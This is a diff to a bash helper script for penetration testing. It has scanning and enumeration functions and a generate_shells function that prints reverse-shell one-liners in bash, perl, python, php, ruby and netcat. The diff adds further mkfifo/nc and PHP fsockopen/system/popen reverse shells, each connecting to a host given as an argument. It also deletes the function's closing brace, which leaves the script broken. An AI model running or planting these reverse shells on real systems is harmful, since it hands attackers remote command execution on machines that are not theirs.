@@ -74,7 +74,6 @@ full_nmap_scan() {
     echo -e "[+] Done!"
 }
 
-
 # runs --top-ports $2 against IP
 quick_nmap_scan() {
     if [[ -z "$2" ]]; then 
@@ -146,7 +145,6 @@ npm_scan() {
     echo -e "\n\n[+]Done."
 }
 
-
 # static code analysis of single JavaScript code
 javascript_sca() {
     echo -e "$BLUE[+] Starting static code analysis of $1 file with nodestructor and semgrep...$CLR"
@@ -162,7 +160,6 @@ privesc_tools_linux() {
     echo -e "$BLUE[+] Starting HTTP server on port 9119...$CLR"
     http 9119
 }
-
 
 # exposes folder with Windows PrivEsc tools on localhost:9119
 privesc_tools_windows() {
@@ -247,7 +244,6 @@ nfs_enum() {
     echo -e "\n[+] Done."
 }
 
-
 # if RPC on port 111 shows in rpcinfo that nfs on port 2049 is available
 # we can enumerate nfs shares available:
 subdomenum() {
@@ -255,7 +251,6 @@ subdomenum() {
     enumeratescope $1 $2
     echo -e "\n[+] Done."
 }
-
 
 # checking AWS S3 bucket
 s3() {
@@ -399,7 +394,8 @@ generate_shells() {
 
     echo -e "\033[41m[bash]\033[0m bash -i >& /dev/tcp/$1/$port 0>&1"
     echo -e "\033[41m[bash]\033[0m 0<&196;exec 196<>/dev/tcp/$1/$port; sh <&196 >&196 2>&196"
-    echo -e "\033[41m[bash]\033[0m exec 5<>/dev/tcp/$1/$port | cat <&5 | while read line; do $line 2>&5 >&5; done"
+    echo -e "\033[41m[bash]\033[0m rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $1 $port >/tmp/f"
+    echo -e "\033[41m[bash]\033[0m rm -f backpipe; mknod /tmp/backpipe p && nc $ip $port 0<backpipe | /bin/bash 1>backpipe"
     echo -e "$NEWLINE"
     echo -e "\033[42m[perl]\033[0m perl -e 'use Socket;\$i=\"$1\";\$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
     echo -e "\033[42m[perl]\033[0m perl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"$1:$port\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'"
@@ -408,6 +404,9 @@ generate_shells() {
     echo -e "\033[43m[python]\033[0m python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$1\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]\033[0m);'"
     echo -e "$NEWLINE"
     echo -e "\033[44m[php]\033[0m php -r '\$sock=fsockopen(\"$1\",$port);exec(\"/bin/sh -i \<\&3 \>\&3 2\>\&3\");'"
+    echo -e "\033[44m[php]\033[0m php -r '\$sock=fsockopen(\"$1\",$port);shell_exec(\"/bin/sh -i \<\&3 \>\&3 2\>\&3\");'"
+    echo -e "\033[44m[php]\033[0m php -r '\$sock=fsockopen(\"$1\",$port);system(\"/bin/sh -i \<\&3 \>\&3 2\>\&3\");'"
+    echo -e "\033[44m[php]\033[0m php -r '\$sock=fsockopen(\"$1\",$port);popen(\"/bin/sh -i \<\&3 \>\&3 2\>\&3\");'"
     echo -e "$NEWLINE"
     echo -e "\033[45m[ruby]\033[0m ruby -rsocket -e'f=TCPSocket.open(\"$1\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
     echo -e "\033[45m[ruby]\033[0m ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"$1\",\"$port\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
@@ -419,7 +418,6 @@ generate_shells() {
     echo -e "\033[46m[netcat]\033[0m rm -f /tmp/p; mknod /tmp/p p && nc $1 $port 0/tmp/p"
     echo -e "\033[46m[netcat]\033[0m rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $1 $port >/tmp/f"
     echo -e "$NEWLINE"
-}
 
 php7() {
     echo -e "$BLUE[+] Switching PHP version to 7.x ...\n$YELLOW"
